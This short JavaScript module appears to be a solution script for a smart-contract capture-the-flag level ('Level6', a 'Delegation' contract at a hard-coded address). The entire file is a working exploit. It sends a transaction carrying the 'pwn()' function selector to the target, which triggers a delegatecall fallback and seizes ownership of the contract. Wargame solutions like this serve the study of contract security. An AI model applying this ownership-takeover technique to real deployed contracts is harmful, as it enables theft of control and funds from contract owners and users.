const level6 = async (web3, Delegation) => {

    const targetAddress = '0xef591dc2cef74211edc4eb595218265bab615f27';
    const target = await Delegation.at(targetAddress);

    console.log(`Exploiting Level6 target ${targetAddress}...`);
    const pwnFn = web3.eth.abi.encodeFunctionSignature('pwn()');
    await target.sendTransaction({data: pwnFn});
};

module.exports = level6;